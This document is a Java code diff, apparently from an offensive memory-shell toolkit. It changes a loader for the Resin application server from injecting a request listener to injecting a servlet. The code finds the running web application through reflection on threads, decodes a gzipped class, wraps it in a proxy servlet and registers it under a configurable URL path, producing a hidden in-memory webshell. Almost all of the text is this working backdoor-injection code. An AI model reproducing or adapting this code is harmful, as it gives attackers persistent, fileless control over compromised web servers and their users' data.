@@ -11,7 +11,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
-import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -19,13 +19,15 @@ import java.util.zip.GZIPInputStream;
  * <p>
  */
 @Middleware(Middleware.Resin)
-@MemShell(MemShell.Listener)
-@JavaClassModifiable({JavaClassModifiable.CLASSNAME})
-public class ResinListenerThreadLoader {
+@MemShell(MemShell.Servlet)
+@JavaClassModifiable({JavaClassModifiable.CLASSNAME, JavaClassModifiable.PATH, JavaClassModifiable.NAME})
+public class ResinServletThreadLoader {
     private static String gzipObject;
     private static String CLASSNAME;
+    private static String PATH;
+    private static String NAME;
 
-    public ResinListenerThreadLoader() {
+    public ResinServletThreadLoader() {
     }
 
     static {
@@ -37,7 +39,7 @@ public class ResinListenerThreadLoader {
     }
 
     /**
-     * Resin Listener
+     * Resin Servlet
      */
     public static void inject() throws Exception {
         Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
@@ -52,25 +54,22 @@ public class ResinListenerThreadLoader {
                 }
 
                 try {
-                    ArrayList _requestListeners = (ArrayList) getFieldValue(webapp, "_requestListeners");
-                    for (int j = 0; j < _requestListeners.size(); j++) {
-                        if (_requestListeners.get(j) instanceof Proxy) {
-                            if (getFieldValue(_requestListeners.get(j), "h").getClass().getName().equalsIgnoreCase(CLASSNAME)) {
-                                return;
-                            }
-                        }
+                    Object _servletManager = getFieldValue(webapp, "_servletManager");
+                    HashMap _servlets = (HashMap) getFieldValue(_servletManager, "_servlets");
+                    if (_servlets.containsKey(NAME)) {
+                        return;
                     }
                 } catch (Exception e) {
 
                 }
 
                 // 动态代理兼容 javax jakarta
-                Class listenerClass = null;
+                Class servletClass = null;
                 try {
-                    listenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
+                    servletClass = Class.forName("jakarta.servlet.Servlet");
                 } catch (Exception e) {
                     try {
-                        listenerClass = Class.forName("javax.servlet.ServletRequestListener");
+                        servletClass = Class.forName("javax.servlet.Servlet");
                     } catch (ClassNotFoundException ex) {
 
                     }
@@ -88,9 +87,14 @@ public class ResinListenerThreadLoader {
                 }
 
                 Object javaObject = clazz.newInstance();
-                Object object = Proxy.newProxyInstance(listenerClass.getClassLoader(), new Class[]{listenerClass}, (InvocationHandler) javaObject);
-                invokeMethod(webapp.getClass(), webapp, "addListenerObject", new Class[]{Object.class, Boolean.TYPE}, new Object[]{object, true});
-                invokeMethod(webapp.getClass(), webapp, "clearCache", new Class[]{}, new Object[]{});
+                Object object = Proxy.newProxyInstance(servletClass.getClassLoader(), new Class[]{servletClass}, (InvocationHandler) javaObject);
+                Object servletMapping = Class.forName("com.caucho.server.dispatch.ServletMapping").newInstance();
+                invokeMethod(servletMapping.getClass().getSuperclass(), servletMapping, "setServletClass", new Class[]{String.class}, new Object[]{object.getClass().getName()});
+                invokeMethod(servletMapping.getClass().getSuperclass(), servletMapping, "setServletName", new Class[]{String.class}, new Object[]{NAME});
+                invokeMethod(servletMapping.getClass(), servletMapping, "addURLPattern", new Class[]{String.class}, new Object[]{PATH});
+
+                setFieldValue(servletMapping, "_singletonServlet", object);
+                invokeMethod(webapp.getClass(), webapp, "addServletMapping", new Class[]{Class.forName("com.caucho.server.dispatch.ServletMapping")}, new Object[]{servletMapping});
                 return;
             } catch (Exception e) {
 
@@ -128,8 +132,7 @@ public class ResinListenerThreadLoader {
             field = clazz.getDeclaredField(fieldName);
             field.setAccessible(true);
         } catch (NoSuchFieldException ex) {
-            if (clazz.getSuperclass() != null)
-                field = getField(clazz.getSuperclass(), fieldName);
+            if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName);
         }
         return field;
     }
